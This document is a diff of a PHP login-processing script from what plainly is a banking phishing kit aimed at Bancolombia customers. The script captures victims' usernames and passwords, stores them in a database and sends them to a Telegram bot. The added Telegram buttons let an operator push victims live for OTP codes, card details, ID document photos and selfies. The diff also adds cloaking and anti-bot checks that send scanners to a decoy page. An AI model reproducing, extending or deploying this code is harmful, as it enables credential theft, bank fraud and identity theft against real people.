@@ -1,25 +1,26 @@
 <?php
-session_start();
-// Enable error reporting
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+// Producción: no mostrar errores al usuario
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
 error_reporting(E_ALL);
 
-// Debug File
-$logFile = __DIR__ . '/debug_log.txt';
+// Log via error_log (funciona en Vercel, no requiere filesystem)
 function logStep($msg)
 {
-    global $logFile;
-    file_put_contents($logFile, date('Y-m-d H:i:s') . " - $msg\n", FILE_APPEND);
+    error_log('[process_login] ' . $msg);
 }
 
-logStep("Script started. Method: " . $_SERVER["REQUEST_METHOD"]);
-
+// Cloaking & Anti-Bot Validation
+require_once __DIR__ . '/../../config/cloak.php';
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    cloak_validate_post_request('../../decoy.php');
 
     // 1. Cargar Configuración Global
     try {
-        $configPath = __DIR__ . '/../../../../config.php';
+        $configPath = __DIR__ . '/../../config/config.php';
         logStep("Loading config from: $configPath");
 
         if (!file_exists($configPath)) {
@@ -29,7 +30,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         $config = require $configPath;
         logStep("Config loaded successfully.");
-    } catch (Exception $e) {
+    }
+    catch (Exception $e) {
         logStep("Exception loading config: " . $e->getMessage());
         die("Error loading config");
     }
@@ -40,33 +42,36 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         die("Error: No se pudo cargar la configuración global.");
     }
 
-    // 2. Conectarse a la DB usando el archivo de conexion global db.php
-    try {
-        $dbPath = __DIR__ . '/../../../../db.php';
-        if (!file_exists($dbPath)) {
-            logStep("ERROR: db.php file not found!");
-            die("Error: db.php not found");
-        }
-        include $dbPath; // Esto define la variable $conn
-        $pdo = $conn;
-        logStep("DB Connected successfully.");
-    } catch (Exception $e) {
-        logStep("DB Connection Error: " . $e->getMessage());
-        die("Error: No se pudo conectar a la base de datos.");
-    }
+    // Conexión Centralizada (MySQL/PostgreSQL)
+    $pdo = require __DIR__ . '/../../config/db.php';
+    logStep("DB Connected successfully via centralized config.");
 
-    // Cargar config local de Bancolombia para Telegram y baseUrl
-    $localConfigPath = __DIR__ . '/../../assets/config/conexion.php';
-    $localConfig = file_exists($localConfigPath) ? require $localConfigPath : [];
+    $bot_token = $config['botToken'];
 
-    $bot_token = $localConfig['telegram']['bot_token'] ?? $config['botToken'];
-    $chat_id = $localConfig['telegram']['chat_id'] ?? $config['chatId'];
-    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/pago/4c7a1d9e/modules/api/actualizar_estado.php');
+    $chat_id = $config['chatId'];
+
+    $baseUrl = $config['baseUrl'];
     $security_key = $config['security_key'];
 
     $usuario = trim($_POST['usuario'] ?? '');
     $clave = trim($_POST['clave'] ?? '');
-    $ip_address = $_SERVER['REMOTE_ADDR'];
+
+    // IP REAL DETECTION (Cloudflare/Proxy Support)
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
+    }
+    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        // Puede venir una lista, tomamos la primera
+        $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ip_address = trim($ip_list[0]);
+    }
+    else {
+        $ip_address = $_SERVER['REMOTE_ADDR'];
+    }
+    // Si sigue siendo local (::1 o 127.0.0.1) es porque accedes desde el mismo pc host
+    if ($ip_address == '::1')
+        $ip_address = '127.0.0.1 (Local)';
+
     $email = $_POST['email'] ?? '';
 
     logStep("Processing user: $usuario, IP: $ip_address, Email: $email");
@@ -79,7 +84,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     try {
         // Insertar en tabla 'pse'
-        $sql = "INSERT INTO pse (estado, ip, usuario, clave, banco, email) VALUES (:estado, :ip, :usuario, :clave, :banco, :email)";
+        $sql = "INSERT INTO pse (estado, ip_address, usuario, clave, banco, email) VALUES (:estado, :ip, :usuario, :clave, :banco, :email)";
         $stmt = $pdo->prepare($sql);
 
         $stmt->execute([
@@ -111,16 +116,29 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $keyboard = [
             'inline_keyboard' => [
                 [
-                    ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
-                    ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
+                    ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$clienteId"],
+                    ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$clienteId"],
                 ],
                 [
-                    ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"],
-                    ['text' => '💳 CC', 'url' => "$baseUrl?id=$clienteId&estado=5&key=$security_key"],
+                    ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$clienteId"],
+                    ['text' => '💳 CC',         'callback_data' => "cmd_5_$clienteId"],
                 ],
                 [
-                    ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"],
-                    ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=7&key=$security_key"],
+                    ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$clienteId"],
+                    ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$clienteId"],
+                ],
+                [
+                    ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$clienteId"],
+                    ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$clienteId"]
+                ],
+                [
+                    ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$clienteId"],
+                    ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$clienteId"]
+                ],
+                [
+                    ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$clienteId"],
+                    ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$clienteId"],
+                    ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$clienteId"]
                 ]
             ]
         ];
@@ -151,21 +169,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         $response = curl_exec($ch);
         logStep("Telegram Response: $response");
-        curl_close($ch);
 
         // Redirigir a espera
         header("Location: ../../index.php?status=espera&id=" . $clienteId);
         logStep("Redirecting to wait screen.");
         exit();
 
-    } catch (PDOException $e) {
+    }
+    catch (PDOException $e) {
         logStep("Error DB: " . $e->getMessage());
         error_log("Error DB: " . $e->getMessage());
         header("Location: ../../index.php");
         exit();
     }
 
-} else {
+}
+else {
     logStep("Not POST request.");
     header("Location: ../../index.php");
     exit();
